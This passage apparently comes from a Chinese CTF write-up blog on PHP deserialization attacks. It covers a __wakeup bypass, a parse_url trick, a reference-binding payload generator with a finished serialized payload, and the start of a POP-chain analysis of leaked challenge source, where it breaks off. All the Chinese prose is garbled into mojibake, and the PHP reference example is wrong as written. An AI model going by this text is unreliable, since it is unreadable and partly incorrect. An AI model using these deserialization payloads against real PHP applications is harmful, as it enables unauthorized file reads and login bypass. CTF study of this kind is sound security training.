&#125;            </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ä¸€çœ¼å°±å¯ä»¥çœ‹å‡ºgetFlag()å‡½æ•°æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„ç‚¹ã€‚è€Œhandleç±»è°ƒç”¨äº†getFlagï¼Œä½†æ˜¯å› ä¸ºhandleç±»è¿˜æœ‰ä¸€ä¸ªwakeupé­”æœ¯æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šæŠŠæˆ‘ä»¬çš„å‚æ•°å…¨éƒ¨è®¾ç½®ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»•è¿‡wakeupã€‚é€šè¿‡ä¸Šé¢å†™çš„phpå‘åºåˆ—åŒ–çš„åŸºç¡€çŸ¥è¯†æˆ‘ä»¬çŸ¥é“:</p>
<blockquote>
<p>åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ  </p>
</blockquote>
<p>æ‰€ä»¥wakeupå¾ˆå¥½ç»•è¿‡,ç°åœ¨éœ€è¦æƒ³æ€ä¹ˆç»•è¿‡index.phpä¸­çš„parse_urlï¼Œé€šè¿‡ç½‘ä¸Šæ‰¾èµ„æ–™æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š</p>
<blockquote>
<p>parse_urlå‡½æ•°åœ¨è§£æurlæ—¶å­˜åœ¨çš„bugé€šè¿‡ï¼š&#x2F;&#x2F;&#x2F;x.php?key&#x3D;valueçš„æ–¹å¼å¯ä»¥ä½¿å…¶è¿”å›False<br>PSï¼šè¯¦ç»†å†…å®¹å‚è€ƒä¸€å¶é£˜é›¶å¸ˆå‚…çš„blog â€”â€“ <a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/">https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/</a></p>
</blockquote>
<p>ç°åœ¨ä¸¤ä¸ªé—®é¢˜éƒ½è§£å†³äº†ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜Flagç±»ä¸­æœ‰ä¸¤ä¸ªmd5(rand(1,10000)),å®ƒä»¬ç”Ÿæˆtokenå’Œtoken_flagã€‚å…¶ä¸­Flagç±»çš„__constuctåœ¨æˆ‘ä»¬åºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè§¦å‘å¹¶èµ‹å€¼ä¸€ä¸ªtoken_flag&#x3D;token&#x3D;MD5(rand(1,10000))ã€‚å½“æˆ‘ä»¬è¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨getFlagå‡½æ•°çš„æ—¶å€™ï¼ŒgetFlagå‡½æ•°ä¼šèµ‹å€¼token_flag&#x3D;md5(rand(1,10000))ï¼Œåªæœ‰è¿™ä¸ªtoken_flagå’Œæˆ‘ä»¬ä¸€å¼€å§‹ä¼ å…¥çš„tokenä¸€è‡´æ‰èƒ½è§¦å‘getFlagçš„è¯»å–æ–‡ä»¶æ“ä½œã€‚è€ŒæŒ‰ç…§æˆ‘ä»¬çš„å¸¸è¯†æ¥è¯´è¿™æ˜¯ä¸å¯èƒ½ç¢°æ’æˆåŠŸçš„(å› ä¸ºæœåŠ¡ç«¯çš„token_flagæ¯æ¬¡éƒ½ä¼šå˜)ã€‚<br>é‚£ä¹ˆè¿™ä¸ªé—®é¢˜æ€ä¹ˆè§£å†³å‘¢ï¼Ÿâ€”â€”â€”â€”â€”-    å¯ä»¥ç”¨phpçš„å¼•ç”¨èµ‹å€¼æ¥ç»•è¿‡ã€‚æ¯”å¦‚ï¼š<br>$test_a &#x3D; 10;<br>$test_b &#x3D; &amp;a;<br>$test_c&#x3D;$test_a+10;<br>æœ€å$test_bçš„å€¼ä¸º20 å› ä¸º$test_b æŒ‡å‘çš„æ˜¯$test_açš„åœ°å€ï¼Œæ‰€ä»¥$test_aæ˜¯å¤šå°‘$test_bä¹Ÿæ˜¯å¤šå°‘ã€‚<br>ç°åœ¨æˆ‘ä»¬æ¥æ„é€ payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line"> &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">        &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(<span class="string">&quot;flag.php&quot;</span>); <span class="comment">//åˆ›å»ºæ—¶ä¼šè°ƒç”¨ __construct__ æ­¤æ—¶ $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</span></span><br><span class="line"><span class="variable">$b</span>-&gt;token=&amp;<span class="variable">$b</span>-&gt;token_flag; <span class="comment">//è¿™é‡ŒæŠŠtokençš„å€¼å’Œtoken_flagçš„å€¼ç»‘åœ¨ä¸€èµ·äº†ã€‚è¿™æ ·ååºåˆ—åŒ–æ—¶$this-&gt;token_flagå˜åŒ–tokenä¹Ÿè·Ÿç€å˜åŒ–</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆä¼ å…¥payload:</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?file=hint.php&amp;payload=O:<span class="number">6</span>:<span class="string">&quot;Handle&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Handle%00handle&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;85f3375756047fba207ce9b85780313b&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;token_flag&quot;</span>;R:<span class="number">4</span>;&#125;&#125; //æ³¨æ„s:<span class="number">14</span>åˆ<span class="number">0x00</span>ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦è¡¥%00ï¼Œä»å­—ç¬¦é•¿åº¦ä¹Ÿå¯çœ‹å‡ºå¼‚å¸¸ã€‚å¦å¤–Handle:<span class="number">2</span> æ˜¯ä¸ºäº†ç»•è¿‡wafã€‚</span><br></pre></td></tr></table></figure>

<h4 id="iæ˜¥ç§‹çš„å…¬ç›Šèµ›è¿”åºåˆ—åŒ–åˆ©ç”¨é“¾"><a href="#iæ˜¥ç§‹çš„å…¬ç›Šèµ›è¿”åºåˆ—åŒ–åˆ©ç”¨é“¾" class="headerlink" title="iæ˜¥ç§‹çš„å…¬ç›Šèµ›è¿”åºåˆ—åŒ–åˆ©ç”¨é“¾"></a>iæ˜¥ç§‹çš„å…¬ç›Šèµ›è¿”åºåˆ—åŒ–åˆ©ç”¨é“¾</h4><p><a href="http://www.zipç›´æ¥æºç æ³„éœ²è¿›è¡Œå®¡è®¡/">www.zipç›´æ¥æºç æ³„éœ²è¿›è¡Œå®¡è®¡</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»update.phpå¯ä»¥çŸ¥é“ç™»å½•çš„ç”¨æˆ·å¯ä»¥æ‰“åˆ°flagï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“adminçš„å¯†ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$mysqli</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;id)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="variable language_">$this</span>-&gt;id;  </span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Info</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getNewinfo</span>());</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;nickname);<span class="comment">//å±</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>,<span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mysqli=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;hostname, <span class="variable">$this</span>-&gt;dbuser, <span class="variable">$this</span>-&gt;dbpass, <span class="variable">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;mysqli-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»lib.phpä¸­å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–å¯æ§ç‚¹åœ¨nickname,ä½†åªæ˜¯éƒ¨åˆ†å¯æ§ï¼Œç”±äºsafeå®‰å…¨wafçš„æ›¿æ¢ï¼Œå¾ˆå®¹æ˜“æƒ³èµ·0CTF-2016-piapiapiaé¢˜ç›®çš„ååºåˆ—åŒ–é€ƒé€¸ï¼Œè§¦å‘ç‚¹åº”è¯¥åœ¨updateå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ååºåˆ—åŒ–é€ƒé€¸æ¥è¿›è¡Œè§¦å‘popåˆ©ç”¨é“¾ã€‚åˆ©ç”¨é“¾ä¸ºï¼š</p>
<p>UpdateHelperç±»è¢«ååºåˆ—åŒ–å®Œæˆæ—¶ä¼šè§¦å‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>echo æ˜¯æ‰“å°å­—ç¬¦ï¼Œå¦‚æœæˆ‘ä»¬æŠŠ$this-&gt;sql èµ‹å€¼ä¸ºuserå¯¹è±¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥è§¦å‘userå¯¹è±¡çš„__tostring</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœnicknameçš„å€¼èµ‹å€¼ä¸ºInfoç±»å®ä¾‹åŒ–åçš„å¯¹è±¡ï¼Œå› ä¸ºinfoæ²¡æœ‰updateæ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨__callé­”æœ¯æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

